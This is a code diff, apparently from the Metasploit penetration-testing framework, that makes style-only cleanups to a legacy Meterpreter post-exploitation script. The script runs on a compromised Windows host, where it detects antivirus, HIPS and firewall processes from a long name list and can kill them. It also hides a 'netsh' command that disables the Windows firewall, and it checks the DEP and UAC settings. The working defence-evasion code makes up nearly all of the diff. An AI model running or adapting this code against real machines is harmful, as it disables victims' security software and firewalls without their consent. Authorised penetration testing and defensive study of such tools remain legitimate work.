@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Meterpreter script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration.
@@ -26,7 +26,7 @@ def usage
 end
 
 #-------------------------------------------------------------------------------
-avs = %W{
+avs = %w(
   a2adguard.exe
   a2adwizard.exe
   a2antidialer.exe
@@ -260,29 +260,29 @@ avs = %W{
   xp-antispy.exe
   zegarynka.exe
   zlclient.exe
-}
+)
 #-------------------------------------------------------------------------------
 # Check for the presence of AV, HIPS and Third Party firewall and/or kill the
 # processes associated with it
-def check(session,avs,killbit)
+def check(session, avs, killbit)
   print_status("Checking for contermeasures...")
-  session.sys.process.get_processes().each do |x|
-    if (avs.index(x['name'].downcase))
-      print_status("\tPossible countermeasure found #{x['name']} #{x['path']}")
-      if (killbit)
-        print_status("\tKilling process for countermeasure.....")
-        session.sys.process.kill(x['pid'])
-      end
+  session.sys.process.get_processes.each do |x|
+    next unless avs.index(x['name'].downcase)
+    print_status("\tPossible countermeasure found #{x['name']} #{x['path']}")
+    if killbit
+      print_status("\tKilling process for countermeasure.....")
+      session.sys.process.kill(x['pid'])
     end
   end
 end
+
 #-------------------------------------------------------------------------------
 # Get the configuration and/or disable the built in Windows Firewall
-def checklocalfw(session,killfw)
+def checklocalfw(session, killfw)
   print_status("Getting Windows Built in Firewall configuration...")
   opmode = ""
-  r = session.sys.process.execute("cmd.exe /c netsh firewall show opmode", nil, {'Hidden' => 'true', 'Channelized' => true})
-  while(d = r.channel.read)
+  r = session.sys.process.execute("cmd.exe /c netsh firewall show opmode", nil, 'Hidden' => 'true', 'Channelized' => true)
+  while (d = r.channel.read)
     opmode << d
   end
   r.channel.close
@@ -290,10 +290,10 @@ def checklocalfw(session,killfw)
   opmode.split("\n").each do |o|
     print_status("\t#{o}")
   end
-  if (killfw)
+  if killfw
     print_status("Disabling Built in Firewall.....")
-    f = session.sys.process.execute("cmd.exe /c netsh firewall set opmode mode=DISABLE", nil, {'Hidden' => 'true','Channelized' => true})
-    while(d = f.channel.read)
+    f = session.sys.process.execute("cmd.exe /c netsh firewall set opmode mode=DISABLE", nil, 'Hidden' => 'true', 'Channelized' => true)
+    while (d = f.channel.read)
       if d =~ /The requested operation requires elevation./
         print_status("\tUAC or Insufficient permissions prevented the disabling of Firewall")
       end
@@ -302,6 +302,7 @@ def checklocalfw(session,killfw)
     f.close
   end
 end
+
 #-------------------------------------------------------------------------------
 # Function for getting the current DEP Policy on the Windows Target
 def checkdep(session)
@@ -310,19 +311,19 @@ def checkdep(session)
   # Expand environment %TEMP% variable
   tmp = session.sys.config.getenv('TEMP')
   # Create random name for the wmic output
-  wmicfile = sprintf("%.5d",rand(100000))
+  wmicfile = sprintf("%.5d", rand(100000))
   wmicout = "#{tmp}\\#{wmicfile}"
   print_status("Checking DEP Support Policy...")
-  r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmicout} OS Get DataExecutionPrevention_SupportPolicy", nil, {'Hidden' => true})
+  r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmicout} OS Get DataExecutionPrevention_SupportPolicy", nil, 'Hidden' => true)
   sleep(2)
   r.close
-  r = session.sys.process.execute("cmd.exe /c type #{wmicout}", nil, {'Hidden' => 'true','Channelized' => true})
-    while(d = r.channel.read)
-      tmpout << d
-    end
+  r = session.sys.process.execute("cmd.exe /c type #{wmicout}", nil, 'Hidden' => 'true', 'Channelized' => true)
+  while (d = r.channel.read)
+    tmpout << d
+  end
   r.channel.close
   r.close
-  session.sys.process.execute("cmd.exe /c del #{wmicout}", nil, {'Hidden' => true})
+  session.sys.process.execute("cmd.exe /c del #{wmicout}", nil, 'Hidden' => true)
   depmode = tmpout.scan(/(\d)/)
   if depmode.to_s == "0"
     print_status("\tDEP is off for the whole system.")
@@ -333,8 +334,8 @@ def checkdep(session)
   elsif depmode.to_s == "3"
     print_status("\tDEP is on for all programs and services.")
   end
-
 end
+
 #-------------------------------------------------------------------------------
 def checkuac(session)
   print_status("Checking if UAC is enabled ...")
@@ -353,7 +354,7 @@ end
 ################## MAIN ##################
 killbt = false
 killfw = false
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-k"
     killbt = true
@@ -362,19 +363,17 @@ killfw = false
   when "-h"
     usage
   end
-}
+end
 # get the version of windows
 if client.platform =~ /win32|win64/
   wnvr = session.sys.config.sysinfo["OS"]
   print_status("Running Getcountermeasure on the target...")
-  check(session,avs,killbt)
+  check(session, avs, killbt)
   if wnvr !~ /Windows 2000/
     checklocalfw(session, killfw)
     checkdep(session)
   end
-  if wnvr =~ /Windows Vista/
-    checkuac(session)
-  end
+  checkuac(session) if wnvr =~ /Windows Vista/
 else
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
